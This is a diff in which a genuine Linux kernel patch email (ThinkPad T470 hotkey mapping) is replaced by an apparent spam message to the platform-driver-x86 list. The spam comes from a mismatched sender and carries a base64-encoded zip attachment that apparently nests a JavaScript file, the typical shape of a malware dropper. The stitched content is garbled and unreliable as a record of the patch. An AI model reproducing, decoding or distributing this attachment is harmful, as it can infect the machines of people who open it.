@@ -1,166 +1,98 @@
-From: Christian Kellner <ckellner@redhat.com>
-Subject: [PATCH 2/2] platform/x86: thinkpad_acpi: add mapping for new hotkeys on T470
-Date: Sat, 25 Feb 2017 19:20:30 +0100
-Message-ID: <20170225182030.19232-3-ckellner@redhat.com>
-References: <20170225182030.19232-1-ckellner@redhat.com>
+From: <wesley.sydnor@louisvillemsd.org>
+Subject: 20970 platform-driver-x86
+Date: Sun, 26 Feb 2017 00:14:06 -0000
+Message-ID: <148806804680.30107.2108727715371863016@surnet.ru>
+Reply-To: <wesley.sydnor@louisvillemsd.org>
+Mime-Version: 1.0
+Content-Type: application/zip; name="48739.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from mx1.redhat.com ([209.132.183.28]:37126 "EHLO mx1.redhat.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1751549AbdBYSVJ (ORCPT
+Received: from ip-31-162-213-155.dsl.surnet.ru ([31.162.213.155]:43986 "HELO
+        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751912AbdBZAOK (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Sat, 25 Feb 2017 13:21:09 -0500
-In-Reply-To: <20170225182030.19232-1-ckellner@redhat.com>
+        Sat, 25 Feb 2017 19:14:10 -0500
+Content-Disposition: attachment
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
-To: Henrique de Moraes Holschuh <ibm-acpi@hmh.eng.br>, Darren Hart <dvhart@infradead.org>, Andy Shevchenko <andy@infradead.org>, ibm-acpi-devel@lists.sourceforge.net, platform-driver-x86@vger.kernel.org
-Cc: Christian Kellner <ckellner@redhat.com>
+To: platform-driver-x86 <platform-driver-x86@vger.kernel.org>
 
-The T470 emits new hkey events in the 0x1311 - 0x1315 range. According
-to the user manual they should launch a user selected favorite
-application (star icon, 0x1311), snipping tool (0x1312, currently
-ignored), enable/disable bluetooth (0x1314) and open they keyboard
-settings (0x1315).
-
-The third nibble (0xf00) is used to differentiate between the original
-hotkeys, the adaptive keyboard codes and the new, additional ones.
-
-Signed-off-by: Christian Kellner <ckellner@redhat.com>
-Reviewed-by: Hans de Goede <hdegoede@redhat.com>
----
- drivers/platform/x86/thinkpad_acpi.c | 90 +++++++++++++++++++++++++++++++-----
- 1 file changed, 78 insertions(+), 12 deletions(-)
-
-diff --git a/drivers/platform/x86/thinkpad_acpi.c b/drivers/platform/x86/thinkpad_acpi.c
-index 83294b28933e..a9f95026be9f 100644
---- a/drivers/platform/x86/thinkpad_acpi.c
-+++ b/drivers/platform/x86/thinkpad_acpi.c
-@@ -1945,6 +1945,15 @@ enum {	/* hot key scan codes (derived from ACPI DSDT) */
- 	TP_ACPI_HOTKEYSCAN_CAMERA_MODE,
- 	TP_ACPI_HOTKEYSCAN_ROTATE_DISPLAY,
- 
-+	/* Lenovo extended keymap, starting at 0x1300 */
-+	TP_ACPI_HOTKEYSCAN_EXTENDED_START = 52,
-+	/* first new observed key (star, favorites) is 0x1311 */
-+	TP_ACPI_HOTKEYSCAN_STAR = 69,
-+	TP_ACPI_HOTKEYSCAN_CLIPPING_TOOL2,
-+	TP_ACPI_HOTKEYSCAN_UNK25,
-+	TP_ACPI_HOTKEYSCAN_BLUETOOTH,
-+	TP_ACPI_HOTKEYSCAN_KEYBOARD,
-+
- 	/* Hotkey keymap size */
- 	TPACPI_HOTKEY_MAP_LEN
- };
-@@ -3252,6 +3261,15 @@ static int __init hotkey_init(struct ibm_init_struct *iibm)
- 		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
- 		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
- 		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+
-+		/* No assignment, used for newer Lenovo models */
-+		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+		KEY_UNKNOWN, KEY_UNKNOWN
-+
- 		},
- 
- 	/* Generic keymap for Lenovo ThinkPads */
-@@ -3337,6 +3355,28 @@ static int __init hotkey_init(struct ibm_init_struct *iibm)
- 		KEY_RESERVED,        /* Microphone cancellation */
- 		KEY_RESERVED,        /* Camera mode */
- 		KEY_RESERVED,        /* Rotate display, 0x116 */
-+
-+		/*
-+		 * These are found in 2017 models (e.g. T470s). The lowest
-+		 * known value is 0x311, which according to the manual should
-+		 * launch a user defined favorite application.
-+		 *
-+		 * The offset for these is TP_ACPI_HOTKEYSCAN_EXTENDED_START,
-+		 * corresponding to 0x34.
-+		 */
-+
-+		/* (assignments unknown, please report if found) */
-+		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+		KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN, KEY_UNKNOWN,
-+		KEY_UNKNOWN,
-+
-+		KEY_FAVORITES,       /* Favorite app, 0x311 */
-+		KEY_RESERVED,        /* Clipping tool */
-+		KEY_RESERVED,
-+		KEY_BLUETOOTH,       /* Bluetooth */
-+		KEY_KEYBOARD         /* Keyboard, 0x315 */
- 		},
- 	};
- 
-@@ -3747,8 +3787,9 @@ static bool adaptive_keyboard_hotkey_notify_hotkey(unsigned int scancode)
- 
- 	default:
- 		if (scancode < FIRST_ADAPTIVE_KEY ||
--		    scancode >= FIRST_ADAPTIVE_KEY + TPACPI_HOTKEY_MAP_LEN -
--				TP_ACPI_HOTKEYSCAN_ADAPTIVE_START) {
-+		    scancode >= FIRST_ADAPTIVE_KEY +
-+		    TP_ACPI_HOTKEYSCAN_EXTENDED_START -
-+		    TP_ACPI_HOTKEYSCAN_ADAPTIVE_START) {
- 			pr_info("Unhandled adaptive keyboard key: 0x%x\n",
- 					scancode);
- 			return false;
-@@ -3779,19 +3820,44 @@ static bool hotkey_notify_hotkey(const u32 hkey,
- 	*send_acpi_ev = true;
- 	*ignore_acpi_ev = false;
- 
--	/* HKEY event 0x1001 is scancode 0x00 */
--	if (scancode > 0 && scancode <= TP_ACPI_HOTKEYSCAN_ADAPTIVE_START) {
--		scancode--;
--		if (!(hotkey_source_mask & (1 << scancode))) {
--			tpacpi_input_send_key_masked(scancode);
--			*send_acpi_ev = false;
--		} else {
--			*ignore_acpi_ev = true;
-+	/*
-+	 * Original events are in the 0x10XX range, the adaptive keyboard
-+	 * found in 2014 X1 Carbon emits events are of 0x11XX. In 2017
-+	 * models, additional keys are emitted through 0x13XX.
-+	 */
-+	switch ((hkey >> 8) & 0xf) {
-+	case 0:
-+		if (scancode > 0 &&
-+		    scancode <= TP_ACPI_HOTKEYSCAN_ADAPTIVE_START) {
-+			/* HKEY event 0x1001 is scancode 0x00 */
-+			scancode--;
-+			if (!(hotkey_source_mask & (1 << scancode))) {
-+				tpacpi_input_send_key_masked(scancode);
-+				*send_acpi_ev = false;
-+			} else {
-+				*ignore_acpi_ev = true;
-+			}
-+			return true;
- 		}
--		return true;
--	} else {
-+		break;
-+
-+	case 1:
- 		return adaptive_keyboard_hotkey_notify_hotkey(scancode);
-+
-+	case 3:
-+		/* Extended keycodes start at 0x300 and our offset into the map
-+		 * TP_ACPI_HOTKEYSCAN_EXTENDED_START. The calculated scancode
-+		 * will be positive, but might not be in the correct range.
-+		 */
-+		scancode -= (0x300 - TP_ACPI_HOTKEYSCAN_EXTENDED_START);
-+		if (scancode >= TP_ACPI_HOTKEYSCAN_EXTENDED_START &&
-+		    scancode < TPACPI_HOTKEY_MAP_LEN) {
-+			tpacpi_input_send_key(scancode);
-+			return true;
-+		}
-+		break;
- 	}
-+
- 	return false;
- }
- 
--- 
-2.11.1
+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
+EAAAAAA=
